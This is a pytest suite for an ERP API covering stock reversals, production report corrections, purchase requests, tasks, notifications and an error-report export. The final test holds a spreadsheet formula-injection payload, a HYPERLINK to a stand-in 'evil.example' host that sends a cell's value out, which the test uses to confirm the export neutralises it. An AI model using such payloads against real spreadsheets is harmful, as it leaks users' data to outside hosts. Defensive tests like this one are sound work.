"""Module business rules: stock reversals, output posting, purchase request decisions, tasks, notification
links, and the Agent's error report."""

from __future__ import annotations

import io
from datetime import date, timedelta

import openpyxl

from tests.conftest import records
from tests.test_scenarios import UZ_TEXT, submit_file, submit_text


def _report(client, headers, world, **overrides):
    body = {"production_date": (date.today() - timedelta(days=1)).isoformat(), "product_id": str(world.a.products["A-001"]),
            "department_id": str(world.a.departments["SEX-1"]), "qty_produced": "100", "qty_accepted": "95", "qty_defective": "5",
            "approve": True, **overrides}
    r = client.post("/api/v1/production/reports", headers=headers, json=body)
    assert r.status_code == 201, r.text
    return r.json()


def _move(client, headers, world, movement_type, quantity, warehouse="FG"):
    return client.post("/api/v1/inventory/movements", headers=headers, json={
        "movement_date": date.today().isoformat(), "movement_type": movement_type, "warehouse_id": str(world.a.warehouses[warehouse]),
        "product_id": str(world.a.products["A-001"]), "quantity": quantity, "unit": "pcs"})


def _balance(client, headers, warehouse_id) -> float:
    rows = client.get("/api/v1/inventory/balances", headers=headers, params={"warehouse_id": str(warehouse_id), "include_zero": True}).json()
    return sum(float(b["qty"]) for b in rows)


# --------------------------------------------------------------------------- stock reversals


def test_report_postings_are_reversed_only_through_the_report(client, world):
    manager = world.login(client, "manager")
    operator = world.login(client, "operator")
    report = _report(client, manager, world)
    detail = client.get(f"/api/v1/production/reports/{report['id']}", headers=manager).json()
    posting = detail["stock_movements"][0]["id"]
    for who in (operator, manager):
        r = client.post(f"/api/v1/inventory/movements/{posting}/reverse", headers=who, json={"reason": "undo output"})
        assert r.status_code == 422 and r.json()["code"] == "posted_by_document", r.text
        assert r.json()["ref_id"] == report["id"]
    assert _balance(client, manager, world.a.warehouses["FG"]) == 95
    r = client.post(f"/api/v1/production/reports/{report['id']}/cancel", headers=manager, json={"reason": "Entered twice"})
    assert r.status_code == 200
    assert _balance(client, manager, world.a.warehouses["FG"]) == 0


def test_reversals_never_make_stock_negative_and_are_final(client, world):
    manager = world.login(client, "manager")
    receipt = _move(client, manager, world, "receipt", "5", "RM").json()
    assert _move(client, manager, world, "issue", "5", "RM").status_code == 201
    r = client.post(f"/api/v1/inventory/movements/{receipt['id']}/reverse", headers=manager, json={"reason": "wrong receipt"})
    assert r.status_code == 422 and r.json()["code"] == "insufficient_stock"
    assert _balance(client, manager, world.a.warehouses["RM"]) == 0

    receipt = _move(client, manager, world, "receipt", "3", "RM").json()
    reversal = client.post(f"/api/v1/inventory/movements/{receipt['id']}/reverse", headers=manager, json={"reason": "typo"})
    assert reversal.status_code == 201
    r = client.post(f"/api/v1/inventory/movements/{reversal.json()['id']}/reverse", headers=manager, json={"reason": "undo the undo"})
    assert r.status_code == 422 and r.json()["code"] == "reversal_not_reversible"
    assert _balance(client, manager, world.a.warehouses["RM"]) == 0


def test_correction_after_output_was_issued(client, world):
    manager = world.login(client, "manager")
    report = _report(client, manager, world)
    assert _move(client, manager, world, "issue", "50").status_code == 201  # 45 left
    body = {"production_date": report["production_date"], "product_id": str(world.a.products["A-001"]),
            "department_id": str(world.a.departments["SEX-1"]), "qty_produced": "100", "qty_accepted": "90", "qty_defective": "10"}
    r = client.post(f"/api/v1/production/reports/{report['id']}/correct", headers=manager, json={"report": body, "reason": "Recount"})
    assert r.status_code == 201, r.text
    assert _balance(client, manager, world.a.warehouses["FG"]) == 40
    # Cancelling it now would take back 90 pieces of which 50 were already issued.
    r = client.post(f"/api/v1/production/reports/{r.json()['id']}/cancel", headers=manager, json={"reason": "Wrong"})
    assert r.status_code == 422 and r.json()["code"] == "insufficient_stock"


# --------------------------------------------------------------------------- finished-goods warehouse


def test_missing_output_warehouse_is_reported_not_skipped_silently(client, world, owner_engine):
    admin = world.login(client, "admin")
    r = client.patch("/api/v1/company/settings", headers=admin, json={"settings": {"production_output_warehouse_id": None}})
    assert r.status_code == 200
    report = _report(client, admin, world)
    assert [w["code"] for w in report["warnings"]] == ["output_not_posted"]
    assert client.get(f"/api/v1/production/reports/{report['id']}", headers=admin).json()["warnings"] == report["warnings"]
    draft = _report(client, admin, world, approve=False, production_date=(date.today() - timedelta(days=2)).isoformat())
    assert draft["warnings"] == []
    approved = client.post(f"/api/v1/production/reports/{draft['id']}/approve", headers=admin).json()
    assert [w["code"] for w in approved["warnings"]] == ["output_not_posted"]

    operator = world.login(client, "operator")
    job = submit_text(client, operator, UZ_TEXT.replace("21-oktabr", "15-oktabr"))
    rec = client.get(f"/api/v1/agent/records/{records(client, operator, job['id'])['items'][0]['id']}", headers=operator).json()
    assert any(i["rule_code"] == "output_warehouse_missing" and i["severity"] == "warning" for i in rec["issues"])
    assert rec["review_group"] == "needs_approval"

    client.patch("/api/v1/company/settings", headers=admin,
                 json={"settings": {"production_output_warehouse_id": str(world.a.warehouses["FG"])}})
    report = _report(client, admin, world, production_date=(date.today() - timedelta(days=3)).isoformat())
    assert report["warnings"] == []


# --------------------------------------------------------------------------- purchase requests & tasks


def test_every_purchase_request_decision_keeps_its_comment(client, world):
    manager = world.login(client, "manager")
    pr = client.post("/api/v1/supply/purchase-requests", headers=manager, json={
        "request_date": date.today().isoformat(), "lines": [{"description": "Bolts", "quantity": "10", "unit": "pcs"}]}).json()

    def decide(status, comment=None):
        r = client.post(f"/api/v1/supply/purchase-requests/{pr['id']}/status", headers=manager, json={"status": status, "comment": comment})
        assert r.status_code == 200, r.text
        return r.json()

    assert decide("approved", "Approved by UI test")["decision_comment"] == "Approved by UI test"
    assert decide("ordered")["decision_comment"] == "Approved by UI test"  # no comment: the last one stays
    closed = decide("closed", "Delivered and closed")
    assert closed["decision_comment"] == "Delivered and closed" and closed["status"] == "closed"


def test_purchase_request_without_currency_uses_the_company_default(client, world):
    manager = world.login(client, "manager")
    text = ("Xarid uchun ariza № ZK-2026-091\nSana: " + date.today().strftime("%d.%m.%Y") + "\nBo'lim: 2-sex\n\n"
            "| Nomi | Miqdor | Birlik | Narx |\n|---|---|---|---|\n| Sement M400 | 200 | qop | 65000 |")
    job = submit_text(client, manager, text)
    rec_id = records(client, manager, job["id"])["items"][0]["id"]
    assert client.post(f"/api/v1/agent/records/{rec_id}/approve", headers=manager).status_code == 200
    r = client.post(f"/api/v1/agent/jobs/{job['id']}/commit", headers=manager)
    assert r.status_code == 202
    prs = client.get("/api/v1/supply/purchase-requests", headers=manager, params={"q": "ZK-2026-091"}).json()["items"]
    pr = next(p for p in prs if p["external_number"] == "ZK-2026-091")
    assert pr["currency"] == "UZS" and float(pr["total_estimated"]) == 13_000_000


def test_purchase_request_without_items_is_reported_once(client, world):
    manager = world.login(client, "manager")
    job = submit_text(client, manager, "Xarid uchun ariza № ZK-2026-092\nSana: " + date.today().strftime("%d.%m.%Y") +
                      "\nBo'lim: 2-sex\nYetkazib beruvchi: Qizilqum Sement", record_type="purchase_request")
    rec = client.get(f"/api/v1/agent/records/{records(client, manager, job['id'])['items'][0]['id']}", headers=manager).json()
    assert [i["rule_code"] for i in rec["issues"]].count("no_lines") == 1


def test_reopened_task_clears_and_restamps_its_completion(client, world):
    manager = world.login(client, "manager")
    task = client.post("/api/v1/tasks", headers=manager, json={"title": "Check the press"}).json()

    def update(status):
        r = client.patch(f"/api/v1/tasks/{task['id']}", headers=manager, json={"status": status})
        assert r.status_code == 200, r.text
        return r.json()

    first = update("done")["completed_at"]
    assert first
    assert update("open")["completed_at"] is None
    again = update("done")["completed_at"]
    assert again and again != first


def test_notifications_link_to_pages_that_open_the_item(client, world):
    manager = world.login(client, "manager")
    operator = world.login(client, "operator")
    members = {m["email"]: m["id"] for m in client.get("/api/v1/members/directory", headers=manager).json()}
    task = client.post("/api/v1/tasks", headers=manager, json={"title": "Check the press",
                                                                "assignee_id": members[world.users["operator"]]}).json()
    links = {n["link"] for n in client.get("/api/v1/notifications", headers=operator).json()["items"]}
    assert f"/tasks?task={task['id']}" in links

    pr = client.post("/api/v1/supply/purchase-requests", headers=operator, json={
        "request_date": date.today().isoformat(), "lines": [{"description": "Bolts", "quantity": "10", "unit": "pcs"}]}).json()
    links = {n["link"] for n in client.get("/api/v1/notifications", headers=manager).json()["items"]}
    assert f"/supply?request={pr['id']}" in links


# --------------------------------------------------------------------------- Agent error report


def test_error_report_writes_untrusted_values_as_text(client, world):
    operator = world.login(client, "operator")
    csv = (b"Sana,Mahsulot,Sex,Miqdor,Izoh\n"
           b"12.04.2014,=HYPERLINK(\"http://evil.example/?x=\"&A1;\"click\"),1-sex,7,=1+1\n")
    job = submit_file(client, operator, "evil.csv", csv, record_type="production_report")
    r = client.get(f"/api/v1/agent/jobs/{job['id']}/error-report", headers=operator)
    assert r.status_code == 200
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if isinstance(c.value, str) and c.value.startswith("=")]
    assert cells, "the dangerous values are in the report"
    assert all(c.data_type == "s" for c in cells)
